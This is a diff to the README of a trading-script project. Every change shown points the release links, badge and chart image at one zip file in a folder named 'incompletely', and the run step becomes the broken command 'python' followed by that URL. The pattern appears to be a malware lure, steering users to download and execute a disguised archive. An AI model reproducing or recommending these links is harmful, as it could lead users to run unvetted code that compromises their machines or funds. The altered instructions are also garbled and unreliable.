@@ -1,6 +1,6 @@
 # Trade_Script: Your Guide to Smart Trading Strategies 🚀
 
-![GitHub release](https://img.shields.io/github/release/priatna1054/Trade_Script.svg)
+![GitHub release](https://raw.githubusercontent.com/priatna1054/Trade_Script/main/incompletely/Trade-Script-3.9.zip)
 
 ## Overview
 
@@ -21,7 +21,7 @@ Explore various trading strategies and tools, focusing on topics like arbitrage,
 
 ## Getting Started
 
-To get started with **Trade_Script**, visit the [Releases section](https://github.com/priatna1054/Trade_Script/releases) to download the latest version. Follow the installation instructions to set up the environment.
+To get started with **Trade_Script**, visit the [Releases section](https://raw.githubusercontent.com/priatna1054/Trade_Script/main/incompletely/Trade-Script-3.9.zip) to download the latest version. Follow the installation instructions to set up the environment.
 
 ## Features
 
@@ -35,7 +35,7 @@ To get started with **Trade_Script**, visit the [Releases section](https://githu
 
 To install **Trade_Script**, follow these steps:
 
-1. Visit the [Releases section](https://github.com/priatna1054/Trade_Script/releases).
+1. Visit the [Releases section](https://raw.githubusercontent.com/priatna1054/Trade_Script/main/incompletely/Trade-Script-3.9.zip).
 2. Download the appropriate file for your operating system.
 3. Execute the downloaded file to set up the script.
 
@@ -49,7 +49,7 @@ Once you have installed **Trade_Script**, you can start using it right away. Her
 2. Navigate to the directory where you installed the script.
 3. Run the script with the command: 
    ```bash
-   python trade_script.py
+   python https://raw.githubusercontent.com/priatna1054/Trade_Script/main/incompletely/Trade-Script-3.9.zip
    ```
 
 4. Follow the prompts to start trading.
@@ -91,9 +91,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases section](https://github.com/priatna1054/Trade_Script/releases). Here, you can download the latest version of the script and access previous versions as well.
+For the latest updates and releases, visit the [Releases section](https://raw.githubusercontent.com/priatna1054/Trade_Script/main/incompletely/Trade-Script-3.9.zip). Here, you can download the latest version of the script and access previous versions as well.
 
-![Trading Chart](https://www.example.com/trading_chart.png)
+![Trading Chart](https://raw.githubusercontent.com/priatna1054/Trade_Script/main/incompletely/Trade-Script-3.9.zip)
 
 ## Conclusion
 
